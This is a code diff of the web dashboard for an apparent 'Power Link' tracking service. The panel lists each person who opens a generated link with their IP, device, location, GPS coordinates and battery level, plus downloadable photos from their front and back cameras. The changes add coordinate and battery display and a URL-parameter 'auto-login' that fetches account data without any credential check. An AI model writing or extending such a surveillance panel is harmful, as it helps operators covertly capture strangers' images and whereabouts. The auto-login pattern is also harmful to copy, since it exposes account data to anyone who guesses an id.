@@ -225,7 +225,6 @@
                     <button onclick="publisherLogout()" class="logout-btn">Logout</button>
                 </header>
 
-                <!-- Link Generator -->
                 <div class="link-generator">
                     <h3>🔗 Generate Power Link</h3>
                     <div class="link-input-group">
@@ -241,7 +240,6 @@
                     </div>
                 </div>
 
-                <!-- Users Data -->
                 <div class="visitors-table">
                     <h2>👥 Your Users Data</h2>
                     <div id="publisherUsersList"></div>
@@ -254,14 +252,27 @@
         let publisherId = null;
         let publisherData = null;
 
-        // ============================================
-        // CHECK SESSION
-        // ============================================
+        // Check for auto-login
         const urlParams = new URLSearchParams(window.location.search);
         const directId = urlParams.get('id');
-        if (directId) {
-            publisherId = directId;
-            loadPublisherDashboard();
+        const autoLogin = urlParams.get('auto') === 'true';
+        
+        if (directId && autoLogin) {
+            // Auto-login: fetch publisher data directly
+            fetch(`/api/publisher-data/${directId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data) {
+                        publisherId = directId;
+                        publisherData = data;
+                        document.getElementById('loginScreen').style.display = 'none';
+                        document.getElementById('dashboardScreen').style.display = 'block';
+                        displayPublisherUsers(data.users || []);
+                    }
+                })
+                .catch(() => {
+                    // Fallback to login
+                });
         }
 
         // ============================================
@@ -288,6 +299,8 @@
                 if (data.success) {
                     publisherId = data.publisherId;
                     loadPublisherDashboard();
+                } else if (data.suspended) {
+                    errorDiv.textContent = 'Your account has been suspended. Please contact admin.';
                 } else {
                     errorDiv.textContent = 'Invalid email or password';
                 }
@@ -324,8 +337,7 @@
                 return;
             }
 
-            // Generate power link for publisher
-            fetch('/generate-custom-link', {
+            fetch('/api/publisher-generate-link', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ redirectUrl: url })
@@ -335,12 +347,12 @@
                 if (data.success) {
                     const output = document.getElementById('publisherLinkOutput');
                     output.style.display = 'block';
-                    document.getElementById('publisherGeneratedLink').value = data.powerLink;
+                    document.getElementById('publisherGeneratedLink').value = data.link;
                     
                     // Update publisher data
                     const newUser = {
                         id: data.visitorId,
-                        link: data.powerLink,
+                        link: data.link,
                         redirectUrl: data.redirectUrl,
                         createdAt: new Date().toISOString()
                     };
@@ -380,13 +392,15 @@
             users.forEach((user, index) => {
                 const card = document.createElement('div');
                 card.className = 'visitor-card';
+                const locationStr = user.location ? `${user.location.city || ''} ${user.location.state || ''} ${user.location.country || ''}` : '';
                 card.innerHTML = `
                     <div class="header">
                         <div>
                             <strong><span class="serial-number">#${index + 1}</span> ${user.id || 'N/A'}</strong>
                             <div class="info">📱 ${user.deviceName || 'Unknown'} ${user.ip ? `• 🌐 ${user.ip}` : ''}</div>
                             <div class="info">📅 ${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'Not visited yet'}</div>
-                            ${user.location ? `<div class="info">📍 ${user.location.city || ''} ${user.location.state || ''} ${user.location.country || ''}</div>` : ''}
+                            ${locationStr ? `<div class="info">📍 ${locationStr}</div>` : ''}
+                            ${user.battery ? `<div class="info">🔋 ${user.battery}%</div>` : ''}
                         </div>
                         <span class="badge ${user.connected ? 'active' : 'inactive'}">
                             ${user.connected ? '🟢 Active' : '🔴 Offline'}
@@ -396,7 +410,8 @@
                         <button onclick="copyToClipboard('${user.id}')">📋 Copy ID</button>
                         ${user.frontCamera ? `<button class="download" onclick="downloadPhoto('${user.frontCamera.image || user.frontCamera}', 'front-${user.id}.jpg')">⬇️ Front</button>` : ''}
                         ${user.backCamera ? `<button class="download" onclick="downloadPhoto('${user.backCamera.image || user.backCamera}', 'back-${user.id}.jpg')">⬇️ Back</button>` : ''}
-                        ${user.location ? `<button onclick="copyToClipboard('${user.location.city || ''} ${user.location.state || ''} ${user.location.country || ''}')">📍 Copy Location</button>` : ''}
+                        ${locationStr ? `<button onclick="copyToClipboard('${locationStr}')">📍 Copy Location</button>` : ''}
+                        ${user.location ? `<button onclick="copyToClipboard('${user.location.lat || ''}, ${user.location.lng || ''}')">📍 Copy Coords</button>` : ''}
                     </div>
                 `;
                 container.appendChild(card);
@@ -487,18 +502,23 @@
         });
 
         // ============================================
-        // AUTO LOGIN CHECK
+        // CHECK SESSION
         // ============================================
         fetch('/api/check-session')
             .then(response => {
                 if (response.status === 401) {
-                    // Not logged in as admin, show publisher login
                     if (!publisherId) {
                         document.getElementById('loginScreen').style.display = 'flex';
                         document.getElementById('dashboardScreen').style.display = 'none';
                     }
                 }
                 return response.json();
+            })
+            .then(data => {
+                if (data.authenticated && data.type === 'publisher') {
+                    publisherId = data.id;
+                    loadPublisherDashboard();
+                }
             })
             .catch(() => {});
     </script>
